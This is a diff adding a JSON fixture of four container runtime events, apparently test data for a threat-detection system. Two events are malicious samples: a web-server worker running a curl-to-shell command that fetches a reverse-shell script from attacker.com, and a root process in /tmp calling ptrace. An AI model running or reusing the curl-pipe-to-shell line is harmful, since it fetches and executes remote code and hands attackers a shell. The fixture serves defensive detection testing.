@@ -1,0 +1,46 @@
+[
+  {
+    "event_id": "ev-rt-001",
+    "timestamp": "2026-10-19T21:40:00Z",
+    "container_id": "cnt-prod-frontend-89f",
+    "process_executable": "/bin/sh",
+    "process_args": ["/bin/sh", "-c", "curl http://attacker.com/rev.sh | sh"],
+    "parent_process": "nginx: worker process",
+    "syscall": "execve",
+    "user_id": 101,
+    "is_root": false
+  },
+  {
+    "event_id": "ev-rt-002",
+    "timestamp": "2026-10-19T21:40:15Z",
+    "container_id": "cnt-prod-frontend-89f",
+    "process_executable": "/usr/bin/python3",
+    "process_args": ["python3", "worker.py"],
+    "parent_process": "containerd-shim",
+    "syscall": "clone",
+    "user_id": 0,
+    "is_root": true
+  },
+  {
+    "event_id": "ev-rt-003",
+    "timestamp": "2026-10-19T21:40:30Z",
+    "container_id": "cnt-prod-frontend-89f",
+    "process_executable": "/tmp/exploit",
+    "process_args": ["./exploit"],
+    "parent_process": "/bin/sh",
+    "syscall": "ptrace",
+    "user_id": 0,
+    "is_root": true
+  },
+  {
+    "event_id": "ev-rt-004",
+    "timestamp": "2026-10-19T21:40:45Z",
+    "container_id": "cnt-prod-backend-33a",
+    "process_executable": "/usr/local/bin/gunicorn",
+    "process_args": ["gunicorn", "-w", "4", "app:app"],
+    "parent_process": "systemd",
+    "syscall": "epoll_wait",
+    "user_id": 10001,
+    "is_root": false
+  }
+]
